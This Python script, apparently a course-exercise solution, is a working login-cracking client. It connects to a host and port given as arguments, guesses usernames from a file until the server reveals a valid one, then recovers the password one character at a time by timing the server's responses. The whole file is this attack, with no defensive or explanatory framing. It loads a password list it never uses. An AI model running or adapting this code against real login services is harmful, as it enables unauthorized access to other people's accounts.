import socket
from sys import argv
import itertools
import json
from datetime import datetime

class Client:
    def __init__(self, host, port, tmp_pass, tmp_login):
        self.host = host
        self.port = int(port)
        self.tmp_pass = tmp_pass
        self.tmp_login = tmp_login
        self.password = str()
        self.string = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
        self.lp_json = {"login": ' ',
                        "password": ' '}

    def hack_server(self):
        with socket.socket() as client_socket:
            client_socket.connect((self.host, self.port))
            for login in self.tmp_login:
                self.lp_json["login"] = login
                message = json.dumps(self.lp_json)
                client_socket.send(message.encode())
                response = client_socket.recv(1024)
                response = response.decode()
                response = json.loads(response)
                if response['result'] == 'Wrong password!':
                    break

            while True:
                for char in self.string:
                    self.password += char
                    self.lp_json["password"] = self.password
                    message = json.dumps(self.lp_json)
                    start = datetime.now()
                    client_socket.send(message.encode())
                    response = client_socket.recv(1024)
                    finish = datetime.now()
                    response = response.decode()
                    response = json.loads(response)
                    if response['result'] == "Connection success!":
                        print(json.dumps(self.lp_json))
                        exit()
                    if (finish - start).microseconds < 90000:
                        self.password = self.password[:-1]


class Password:
    def __init__(self):
        self.password_tmp = str()

    def parsing_password(self):
        with open('passwords.txt', 'r', encoding='utf-8')as file:
            for password in file:
                self.password_tmp += password
            self.password_tmp = self.password_tmp.split('\n')
            self.password_tmp = [x for x in self.password_tmp if x.isalpha()]

        return self.password_tmp


class Login:
    def __init__(self):
        self.login_tmp = str()

    def parsing_login(self):
        with open('logins.txt', 'r', encoding='utf-8')as file:
            for logn in file:
                self.login_tmp += logn
            self.login_tmp = self.login_tmp.split('\n')

        return self.login_tmp


if __name__ == '__main__':
    host, port = argv[1:]
    login_tmp = Login()
    login_tmp = login_tmp.parsing_login()
    password_tmp = Password()
    password_tmp = password_tmp.parsing_password()
    run = Client(host, port, password_tmp, login_tmp)
    run.hack_server()